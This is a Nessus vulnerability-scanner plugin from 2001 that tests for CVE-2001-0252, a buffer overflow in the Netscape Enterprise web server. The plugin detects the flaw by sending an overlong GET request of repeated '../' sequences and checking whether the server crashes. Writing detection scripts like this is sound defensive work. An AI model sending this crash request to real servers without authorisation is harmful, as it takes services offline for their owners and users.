#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10689);
 script_bugtraq_id(2282);
 script_version ("$Revision: 1.10 $");
 script_cve_id("CVE-2001-0252");
 
 name["english"] = "Netscape Enterprise '../' buffer overflow";

 script_name(english:name["english"]);
 
 desc["english"] = "
The remote web server seems to crash when it is issued
a too long request with dots (ie: ../../../../ 1000 times)

An attacker may use this flaw to disable the remote server

Solution : http://www.iplanet.com/support/iws-alert/index.html
Risk factor : High";



 script_description(english:desc["english"]);
 
 summary["english"] = "../../ overflow";
 summary["francais"] = "Overflow de ../../";
 
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_DENIAL);
 
 
 script_copyright(english:"This script is Copyright (C) 2001 Renaud Deraison",
		francais:"Ce script est Copyright (C) 2001 Renaud Deraison");
 family["english"] = "Denial of Service";
 family["francais"] = "Déni de service";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes");
 script_require_ports("Services/www", 80);
 exit(0);
}

#
# The script code starts here
#

include("http_func.inc");

port = get_http_port(default:80);

if(get_port_state(port))
{
 if(http_is_dead(port:port))exit(0);


 soc = http_open_socket(port);
 if(soc)
 {
  req = crap(data:"../", length:4032);
  d = http_get(item:req, port:port);
  send(socket:soc, data:d);
  r = http_recv(socket:soc);
  http_close_socket(soc);
  
  if(http_is_dead(port:port))security_hole(port);
 }
}
